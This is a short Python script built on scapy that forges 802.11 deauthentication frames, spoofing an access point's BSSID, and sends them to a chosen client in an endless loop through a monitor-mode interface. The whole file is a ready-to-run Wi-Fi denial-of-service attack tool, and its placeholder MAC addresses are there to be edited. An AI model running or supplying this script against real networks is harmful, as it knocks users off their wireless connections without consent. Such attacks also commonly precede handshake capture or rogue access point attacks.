#!/usr/bin/env python
# by @aetsu
import signal
import sys
from scapy.all import *

conf.iface = 'mon0'  # monitor mode
bssid = 'aa:bb:cc:dd:ee:ff'  # bssid to attacket AP
client = '11:22:33:44:55:66'  # client to deauth
conf.verb = 0  # hide the scappy output


def signal_handler(signal, frame):
    """
    Captures the CTRL+C interruption
    """
    sys.exit(0)

if __name__ == "__main__":
    # press CTRL+C to stop the script
    signal.signal(signal.SIGINT, signal_handler)

    # forge a deauth packet (subtype 12)
    packet = RadioTap()/Dot11(
        type=0, subtype=12, addr1=client,
        addr2=bssid, addr3=bssid
    )/Dot11Deauth(reason=7)

    while True:
        sendp(packet)
        print(
            'Deauth packet sent to BSSID: ' + bssid + '  Client: ' + client
        )
